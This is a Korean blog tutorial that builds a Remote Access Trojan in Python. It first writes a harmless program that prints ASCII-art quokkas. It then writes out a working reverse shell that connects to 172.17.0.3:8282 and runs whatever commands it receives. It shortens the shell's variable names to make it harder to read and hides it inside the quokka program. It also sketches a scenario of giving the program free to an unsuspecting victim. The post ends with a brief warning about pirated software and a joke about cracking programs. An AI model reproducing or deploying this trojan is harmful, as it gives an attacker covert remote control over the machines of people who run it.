# Quokka RAT : 정상프로그램인 척 하는 악성프로그램, 트로이목마

<aside>
⚠️ author : 전재호(agamtt) 2024-03-15

</aside>

# 트로이목마(Trojan)

![Untitled](Untitled%20595.png)

트로이목마(Trojan) 은 다른 컴퓨터에서 몰래 실행되면서, 악의적인 행동을 하는 컴퓨터 프로그램을 말합니다.

![Untitled](Untitled%20596.png)

그리스 로마 신화에 등장하는 “트로이 목마”에서 따온 것으로, 트로이 전쟁 때, 튼튼한 트로이 성을 함락시키기 위해 무장한 군인들이 나무로 만든 귀여운 목마 안에 몰래 들어갔다가 성 안에서 나와 성을 함락시켰다는 것에서 유래되었습니다.

트로이목마도, 겉으로는 멀쩡한 프로그램 처럼 보이지만, 사실은 설치된 컴퓨터의 개인정보를 몰래 전송하거나, 컴퓨터를 원격 조종합니다.

트로이목마는 그 기능에 따라 다양하게 분류되는데, 이번에 만들 것은 **RAT(Remote Access Trojan)** 입니다. 트로이목마 중에서도, 대상 컴퓨터를 원격으로 조종할 수 있는 기능을 가진 트로이목마입니다. 

# 목마 제작

파이썬으로 정상적인 프로그램을 만들어 봅시다.

귀여운 쿼카를 출력하는 프로그램입니다.
(그림은 제가 열심히 그렸습니다.)

```bash
print("<< 귀여운 쿼카 프로그램 >>")

v_quokka = '''         xxxxxxx                      
                      xx     xx                     
   xxx     xxxxxxxxxxxx       xx                    
 xxx  xxxxxx        xx         xx                   
 x      xx                      xx                  
 x                               xx                 
 xx                    xxx        xx                
  xxx     xxx          xxx          xx              
    x     xxx          xxx           xx       xxx   
   xx     xxx                         xx     xx x xx
   x             xxxx                  x    xxxxxxxx
  xx            xxxxx                  x xxxx     xx
 xx                x     x            xxxx        x 
 x           xx   xxxx  xx           xx           x 
 x             xxxx  xxxx          xxx           x  
 x               xx    xx        xxx             x  
 xx                xxxxx         x               x  
  xxx                                            x  
    xxxx                                        x   
   xx                                          xx   
  xx                                           x    
  x                                            x    
xx                                             x    
 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'''

smile_quokka = '''
                         ooo                             
     ooooo             ooo  oo                           
    o    oo    oooooo oo      oo                         
   oo     ooooo     oo         oo                        
   o                            ooo                      
  oo                    ooo       oo                     
   o                   oo ooo      oo                    
   o        ooo      oo             o                    
  oo      oo  oo                     o            ooo    
 oo       o        ooooo              oo         o oooooo
 o                 ooooo               ooooooooooo o ooo 
oo                oooooo                oo           oooo
oo                   oo       oo         o            oo 
 oo          oo      ooo     oo         o            oo  
  o           oooooooo ooooooo       oooo           oo   
  ooo             oo     oo        ooo            oo     
    oo             ooooooo                      ooo      
     oo                                        oo        
     oo       ooooooo                       ooo          
    oo              oooooo               oooo            
    o                 oooo             ooo               
   oo                  oo              o                 
   o                  oooo            o                  
   oo               oooooo            o                  
            ooooooooo                 o                  '''

print("보고싶은 사진 번호를 선택하세요(1~2) : ")
select = input()

if(select=='1'):
    print(v_quokka)
if(select=='2'):
    print(smile_quokka)

print('\n')
print("프로그램을 종료합니다~")
```

실행해보면, 잘 실행됩니다. 귀엽네요

![Untitled](Untitled%20597.png)

![Untitled](Untitled%20598.png)

# 원격 접속 트로이목마 (Remote Access Trojan, RAT)

이 멀쩡해보이는 프로그램에 리버스쉘 악성코드를 숨깁니다.

우리가 만든 악성코드는 이렇게 생겼습니다.

```python
import socket
import subprocess

host = "172.17.0.3"
port = 8282

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

while True:
    command = s.recv(1024).decode()
    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, text=True)
    result = output.stdout
    if(result==''):
        s.send("success".encode())
    else:
        s.send(result.encode())
```

이제 띄어쓰기도 좀 줄이고, 알아보기 힘들게 바꿉니다.

```python
import socket
import subprocess
h="172.17.0.3"
p=8282
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((h,p))
while True:
    c=s.recv(1024).decode()
    output=subprocess.run(c,shell=True,stdout=subprocess.PIPE,text=True)
    result=output.stdout
    if(result==''):
        s.send("suc".encode())
    else:
        s.send(result.encode())
```

이제 이것을 정상 프로그램 안에 삽입합니다.

```python
print("<< 귀여운 쿼카 프로그램 >>")

v_quokka = '''         xxxxxxx                      
                      xx     xx                     
   xxx     xxxxxxxxxxxx       xx                    
 xxx  xxxxxx        xx         xx                   
 x      xx                      xx                  
 x                               xx                 
 xx                    xxx        xx                
  xxx     xxx          xxx          xx              
    x     xxx          xxx           xx       xxx   
   xx     xxx                         xx     xx x xx
   x             xxxx                  x    xxxxxxxx
  xx            xxxxx                  x xxxx     xx
 xx                x     x            xxxx        x 
 x           xx   xxxx  xx           xx           x 
 x             xxxx  xxxx          xxx           x  
 x               xx    xx        xxx             x  
 xx                xxxxx         x               x  
  xxx                                            x  
    xxxx                                        x   
   xx                                          xx   
  xx                                           x    
  x                                            x    
xx                                             x    
 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'''

smile_quokka = '''
                         ooo                             
     ooooo             ooo  oo                           
    o    oo    oooooo oo      oo                         
   oo     ooooo     oo         oo                        
   o                            ooo                      
  oo                    ooo       oo                     
   o                   oo ooo      oo                    
   o        ooo      oo             o                    
  oo      oo  oo                     o            ooo    
 oo       o        ooooo              oo         o oooooo
 o                 ooooo               ooooooooooo o ooo 
oo                oooooo                oo           oooo
oo                   oo       oo         o            oo 
 oo          oo      ooo     oo         o            oo  
  o           oooooooo ooooooo       oooo           oo   
  ooo             oo     oo        ooo            oo     
    oo             ooooooo                      ooo      
     oo                                        oo        
     oo       ooooooo                       ooo          
    oo              oooooo               oooo            
    o                 oooo             ooo               
   oo                  oo              o                 
   o                  oooo            o                  
   oo               oooooo            o                  
            ooooooooo                 o                  '''

print("보고싶은 사진 번호를 선택하세요(1~2) : ")
select = input()

if(select=='1'):
    print(v_quokka)
if(select=='2'):
    print(smile_quokka)

print('\n')
print("프로그램을 종료합니다~")

import socket
import subprocess
h="172.17.0.3"
p=8282
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((h,p))
while True:
    c=s.recv(1024).decode()
    output=subprocess.run(c,shell=True,stdout=subprocess.PIPE,text=True)
    result=output.stdout
    if(result==''):
        s.send("suc".encode())
    else:
        s.send(result.encode())
if(select=='1'):
    print(v_quokka)
if(select=='2'):
    print(smile_quokka)
```

- hacker 는 john 에게 유용한, “귀여운 쿼카 프로그램” 을 무료배포합니다.
- john 은 그것을 잘 실행해서 사용합니다.
- hacker 는 john이 모르는 사이에  john 의 컴퓨터에 대한 원격 접속에 성공합니다.
- john 은 무료 프로그램을 공유해줘서 감사해합니다.

![Untitled](Untitled%20599.png)

<aside>
💡 **이걸 당해?**

우리 프로그램은 간단하니, 딱 봐도 티가 나지만, 실제로 코딩으로 만든 프로그램들은 코드가 몇천줄씩 되기 때문에, 소스코드가 복잡해지면 눈치채기 힘듭니다.
게다가 Python 이 아니라, C언어나 C++ 등으로 만든 프로그램은 소스코드가 컴파일되어있므로 인간이 볼 수 없어 더욱 알기 힘듭니다.

</aside>

사실 이런 일은 우리 주변에서 (꽤) 자주 일어납니다.

![Untitled](Untitled%20600.png)

흠…

![Untitled](Untitled%20601.png)

![Untitled](Untitled%20602.png)

한컴같은 못된 독점 프로그램을 만들어놓으니까 이런 일이 생깁니다.

해킹도 하고 감사도 받고 이거 완전 꿩먹고 알먹기. 해커 입장에선 안할 이유가 없겠죠.

그러니 불법 프로그램을 다운 받을 때에는 조심해야합니다.

~~아니면 직접 크랙하던가…~~

계속